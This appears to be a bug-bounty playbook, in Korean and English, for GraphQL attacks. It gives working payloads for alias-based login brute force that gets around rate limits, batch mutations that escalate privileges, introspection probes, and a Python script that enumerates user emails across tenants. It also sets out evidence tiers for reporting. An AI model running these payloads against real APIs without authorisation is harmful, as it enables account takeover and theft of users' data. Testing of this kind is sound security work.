# Scenario: GraphQL Batching / Aliasing / Introspection Bypass

> GraphQL 특유의 query 구조로 auth/rate limit/IDOR 우회 발생.

## 1. Threat Model
- **타겟**: GraphQL API (Apollo, Graphene, Hasura, custom)
- **공격자**: 저권한 인증 또는 unauthenticated
- **Impact**: rate limit 우회 brute force, auth gap, 대량 IDOR
- **Severity**: Medium–High

## 2. Discovery Signals
- `/graphql` 또는 `/query` endpoint 존재
- GraphiQL/Voyager UI 노출
- Introspection (`__schema`) 허용
- Query batching (`[{query:...}, {query:...}]`) 허용
- Field-level rate limit 없음

## 3. Exploit Chain

### 3.1 Aliasing rate limit bypass
```graphql
query {
  a1: login(email:"x", password:"1")
  a2: login(email:"x", password:"2")
  a3: login(email:"x", password:"3")
  ...
  a1000: login(email:"x", password:"1000")
}
# 단일 HTTP 요청에 1000회 시도 → per-request rate limit 무력화
```

### 3.2 Batch query with privilege escalation
```json
[
  {"query": "mutation { updateProfile(role: \"admin\") { id } }"},
  {"query": "mutation { deleteUser(id: \"victim\") { ok } }"}
]
# 중간 에러 발생해도 계속 처리하는 구현 있음
```

### 3.3 Introspection → hidden fields
```graphql
{ __schema { types { name fields { name args { name type { name } } } } } }
# 공개 UI에 없는 admin mutation 발견 가능
```

### 3.4 Field suggestion leak
```graphql
{ user(id:"x") { emmail } }  # typo
# 응답 "Did you mean 'email'?" → schema 없이도 필드 추정 가능
```

## 4. PoC Template
```bash
# 1. Introspection probe
curl https://api.example/graphql -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}'

# 2. Alias brute force
cat > payload.json <<EOF
{"query":"query B{$(for i in $(seq 1 100); do echo "a$i: login(email:\"x@x\", password:\"$i\")"; done)}"}
EOF
curl https://api.example/graphql -X POST -H "Content-Type: application/json" -d @payload.json

# 3. Tenant IDOR (batch)
curl https://api.example/graphql -X POST -H "Authorization: Bearer $LOW" \
  -d '[{"query":"{project(id:\"victim-uuid\"){name,members{email}}}"}]'
```

```python
# python 자동화 — aliases + paginate
import requests
queries = [f'u{i}: user(id:"{i}") {{ email, role }}' for i in range(1, 1000)]
body = {"query": "query { " + " ".join(queries) + " }"}
r = requests.post("https://api.example/graphql", json=body, headers={"Authorization": f"Bearer {T}"})
```

## 5. Evidence Tier
- E1: 두 계정 cross-tenant read via batch 성공 + 다른 테넌트 identifier 응답 캡처
- E2: alias rate limit bypass 1000회 시도 단일 요청 성공 (brute force 시연)
- E3: introspection 노출만

## 6. Gate 1 / Gate 2
- [ ] Introspection 노출 자체는 informational (프로덕션 권장은 비활성)
- [ ] Alias/batch rate limit bypass는 구체 영향 증명 필요
- [ ] Schema "숨겨진 필드" 발견 단독 — 해당 필드 실제 권한 우회까지 연결해야 Medium+

## 7. Variants
- **Query depth attack**: `{user{friends{friends{...}}}}` → DoS (대부분 OOS)
- **Field duplication**: `{a b a b a b}` CPU 고갈 (DoS, OOS 경향)
- **Persisted query bypass**: APQ 사용 시 hash 충돌
- **Subscription abuse**: WebSocket 연결 개수 제한 우회

## 8. References
- PortSwigger Academy — GraphQL 섹션
- Dolev Farhi — "Black Hat GraphQL" book
- HackerOne top GraphQL reports (공개 다수)
- `knowledge/techniques/cloud_saas_attack_patterns_2026.md` 섹션 5 (SaaS IDOR)
